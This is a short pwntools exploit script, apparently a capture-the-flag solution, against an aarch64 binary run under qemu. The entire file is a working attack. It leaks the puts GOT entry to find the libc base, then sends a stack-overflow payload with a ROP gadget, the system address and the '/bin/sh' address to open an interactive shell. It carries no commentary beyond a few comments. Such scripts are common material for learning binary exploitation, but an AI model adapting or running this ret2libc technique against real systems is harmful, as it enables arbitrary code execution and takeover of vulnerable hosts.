from pwn import *
context(os='linux', arch='aarch64', log_level='debug')
#socat tcp-l:10002,fork exec:"qemu-aarch64 -g 2345 -L /usr/aarch64-linux-gnu  ./pwn";reuseaddr

p = process(["qemu-aarch64","-g","2345","-L", "/usr/aarch64-linux-gnu", "./pwn"])

#p = remote("127.0.0.1",10002)
elf = ELF("./pwn")
libc = ELF("./libc.so.6")
puts_got =elf.got['puts']

p.sendlineafter(b">", "1")
p.sendafter("sensible>>\n", p64(puts_got))
p.send(p64(puts_got))

puts_addr = u64(p.recv(3).ljust(8, b'\x00'))+ 0x4000000000
#puts_addr = u64(r.recvuntil('\n')[-8:6].ljust(8, b'\x00'))
success("puts_addr : %s",hex(puts_addr))
libc_base = puts_addr   - libc.sym['puts']
success("libc_base : %s",hex(libc_base))

system = libc_base + libc.sym['system']
binsh = libc_base + (next(libc.search(b'/bin/sh')))
#0x0000000000063e5c : ldr x0, [sp, #0x18] ; ldp x29, x30, [sp], #0x20 ; ret
gadget = libc_base + 0x63e5c

p.sendlineafter(b">", "2")
payload = b'a'*128 +b'b'*8 + p64(gadget) + p64(0)*3 + p64(system) + p64(0) + p64(binsh)
p.sendlineafter("sensible>>", payload)
p.interactive()